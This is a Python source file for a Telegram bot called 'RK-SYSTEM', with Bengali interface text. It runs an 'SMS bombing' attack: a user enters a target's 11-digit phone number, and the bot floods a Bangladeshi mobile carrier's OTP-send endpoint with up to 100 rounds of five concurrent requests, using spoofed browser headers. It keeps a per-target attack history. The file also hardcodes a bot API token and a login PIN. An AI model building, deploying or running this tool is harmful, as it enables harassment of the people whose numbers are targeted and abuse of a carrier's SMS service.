import telebot
import requests
import asyncio
import aiohttp
import threading
import time
import json
import os
import pytz
from datetime import datetime
from telebot import types
from flask import Flask

# ---------- WEB SERVER FOR RENDER ----------
app = Flask(__name__)

@app.route('/')
def home():
    return "RK-SYSTEM IS ALIVE!"

def run_web():
    # Render port binding
    app.run(host='0.0.0.0', port=10000)

# ---------- CONFIG ----------
API_TOKEN = '8519607285:AAFFBo2m3QiMmh00MUzt3Q6DbVWAipa5INg'
bot = telebot.TeleBot(API_TOKEN)

LOGIN_PIN = "RK2026"
BD_TZ = pytz.timezone('Asia/Dhaka')
HISTORY_FILE = "bombing_history.json"
WAKEUP_URL = "https://rksystemx.onrender.com/"

# ---------- DATA STORAGE ----------
def load_history():
    if os.path.exists(HISTORY_FILE):
        try:
            with open(HISTORY_FILE, "r") as f:
                return json.load(f)
        except: return {}
    return {}

def save_history(data):
    with open(HISTORY_FILE, "w") as f:
        json.dump(data, f, indent=4)

user_data = {}
history_db = load_history()
logged_in_users = set()

# ---------- HIGH POWER SIM API (AIOHTTP) ----------
async def fire_sim_api(session, target):
    """Robi/Airtel High Speed API Call"""
    url = "https://api.robi.com.bd/robi-api/v1/otp/send"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
        "Content-Type": "application/json",
        "Origin": "https://www.robi.com.bd",
        "Referer": "https://www.robi.com.bd/"
    }
    payload = {"msisdn": target}
    try:
        async with session.post(url, json=payload, headers=headers, timeout=5) as resp:
            return resp.status in [200, 201]
    except:
        return False

# ---------- BOMBING ENGINE (ASYNC) ----------
def run_async_bomb(chat_id, phone, amount, msg_id):
    asyncio.run(bomb_task(chat_id, phone, amount, msg_id))

async def bomb_task(chat_id, phone, amount, msg_id):
    success, failed = 0, 0
    start_time = datetime.now(BD_TZ)
    user_data[chat_id].update({'status': 'running', 'round': 0, 'start_time': start_time})

    async with aiohttp.ClientSession() as session:
        for r in range(1, amount + 1):
            if user_data.get(chat_id, {}).get('status') == 'stopped': break
            while user_data.get(chat_id, {}).get('status') == 'paused':
                await asyncio.sleep(1)

            # প্রতি রাউন্ডে একসাথে ৫টি করে রিকোয়েস্ট যাবে (High Speed)
            tasks = [fire_sim_api(session, phone) for _ in range(5)]
            results = await asyncio.gather(*tasks)
            
            for res in results:
                if res: success += 1
                else: failed += 1

            user_data[chat_id].update({'success': success, 'failed': failed, 'round': r})
            
            # UI Update
            running_time = str(datetime.now(BD_TZ) - start_time).split('.')[0]
            update_bombing_ui(chat_id, phone, amount, msg_id, running_time)
            await asyncio.sleep(0.5)

    # Final Save History
    log_time = datetime.now(BD_TZ).strftime('%d/%m/%y | %I:%M %p')
    log_entry = f"🕒 {log_time} | ✅ {success} | ❌ {failed} | Rounds: {amount}"
    uid = str(chat_id)
    if uid not in history_db: history_db[uid] = {}
    if phone not in history_db[uid]: history_db[uid][phone] = []
    history_db[uid][phone].append(log_entry)
    save_history(history_db)

    bot.edit_message_text(f"🏁 **MISSION COMPLETED**\n\n🎯 Target: `{phone}`\n✅ Success: `{success}`\n⏱ Total Time: `{str(datetime.now(BD_TZ)-start_time).split('.')[0]}`", chat_id, msg_id)
    user_data[chat_id]['status'] = 'idle'

def update_bombing_ui(chat_id, phone, amount, msg_id, running_time):
    data = user_data[chat_id]
    text = (
        f"⚡ **RK-SYSTEM SIM BOMBING** ⚡\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 Target: `{phone}`\n"
        f"🔄 Progress: `[{data['round']}/{amount}]`\n"
        f"✅ Sent: `{data['success']}`\n"
        f"❌ Error: `{data['failed']}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏱ Running: `{running_time}`\n"
        f"🕒 BD Time: `{datetime.now(BD_TZ).strftime('%I:%M:%S %p')}`"
    )
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton("⏸ Pause" if data['status']=='running' else "▶ Resume", callback_data="pause_resume")
    markup.add(btn, types.InlineKeyboardButton("🛑 Stop", callback_data="stop"))
    try: bot.edit_message_text(text, chat_id, msg_id, reply_markup=markup, parse_mode="Markdown")
    except: pass

# ---------- HANDLERS ----------
@bot.message_handler(commands=['start'])
def welcome(message):
    chat_id = message.chat.id
    if str(chat_id) not in logged_in_users:
        bot.send_message(chat_id, "🔐 **ACCESS DENIED!**\n\nপাসওয়ার্ড দিয়ে লগইন করুন: `/login RK2026`", parse_mode="Markdown")
    else:
        main_menu(chat_id)

@bot.message_handler(commands=['login'])
def login(message):
    if len(message.text.split()) > 1 and message.text.split()[1] == LOGIN_PIN:
        logged_in_users.add(str(message.chat.id))
        bot.reply_to(message, "✅ লগইন সফল! কন্ট্রোল প্যানেল ওপেন করুন।")
        main_menu(message.chat.id)
    else:
        bot.reply_to(message, "❌ ভুল পিন! সঠিক পিন ব্যবহার করুন।")

def main_menu(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("🚀 Start Attack", callback_data="setup"),
               types.InlineKeyboardButton("📜 History Group", callback_data="history_main"))
    bot.send_message(chat_id, "💎 **RK-SYSTEM CONTROL PANEL**\nনিচের অপশনগুলো বেছে নিন:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    uid = str(chat_id)

    if call.data == "setup":
        msg = bot.send_message(chat_id, "📞 **Target নাম্বার দিন (১১ ডিজিট):**")
        bot.register_next_step_handler(msg, get_number)
    
    elif call.data == "history_main":
        if uid not in history_db or not history_db[uid]:
            bot.answer_callback_query(call.id, "হিস্ট্রি খালি!")
            return
        markup = types.InlineKeyboardMarkup()
        for phone in history_db[uid].keys():
            markup.add(types.InlineKeyboardButton(f"📱 {phone} ({len(history_db[uid][phone])})", callback_data=f"h_{phone}"))
        bot.edit_message_text("📜 **টার্গেট নাম্বার লিস্ট:**", chat_id, call.message.message_id, reply_markup=markup)

    elif call.data.startswith("h_"):
        phone = call.data.split("_")[1]
        logs = history_db[uid][phone]
        text = f"📜 **History for {phone}:**\n\n" + "\n".join(logs[-10:])
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("⬅️ Back", callback_data="history_main"))
        bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup)

    elif call.data == "confirm_attack":
        data = user_data[chat_id]
        bot.delete_message(chat_id, call.message.message_id)
        msg = bot.send_message(chat_id, "⚙️ **API Initializing...**")
        # Async থ্রেডে অ্যাটাক শুরু করা
        threading.Thread(target=run_async_bomb, args=(chat_id, data['target'], data['amount'], msg.message_id)).start()

    elif call.data == "pause_resume":
        user_data[chat_id]['status'] = "paused" if user_data[chat_id]['status'] == "running" else "running"
    
    elif call.data == "stop":
        user_data[chat_id]['status'] = "stopped"

def get_number(message):
    if not message.text.isdigit() or len(message.text) != 11:
        bot.reply_to(message, "❌ ভুল নাম্বার! ১১ ডিজিট সঠিক নাম্বার দিন।")
        return
    user_data[message.chat.id] = {'target': message.text}
    msg = bot.send_message(message.chat.id, "📊 **কত রাউন্ড বোমা মারবেন? (সর্বোচ্চ ১০০):**")
    bot.register_next_step_handler(msg, get_amount)

def get_amount(message):
    try:
        amount = int(message.text)
        user_data[message.chat.id]['amount'] = min(amount, 100)
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("✅ CONFIRM", callback_data="confirm_attack"),
                   types.InlineKeyboardButton("❌ CANCEL", callback_data="setup"))
        bot.send_message(message.chat.id, f"🎯 Target: `{user_data[message.chat.id]['target']}`\n📊 Rounds: `{user_data[message.chat.id]['amount']}`\nনিশ্চিত করুন:", reply_markup=markup, parse_mode="Markdown")
    except:
        bot.reply_to(message, "❌ রাউন্ড সংখ্যা অবশ্যই একটি নাম্বার হতে হবে।")

# ---------- WAKEUP SYSTEM ----------
def wakeup():
    while True:
        try:
            requests.get(WAKEUP_URL, timeout=10)
        except: pass
        time.sleep(600)

# ---------- RUN EVERYTHING ----------
if __name__ == "__main__":
    threading.Thread(target=run_web, daemon=True).start()
    threading.Thread(target=wakeup, daemon=True).start()
    print("✅ RK-SYSTEM IS READY ON PORT 10000")
    bot.infinity_polling()
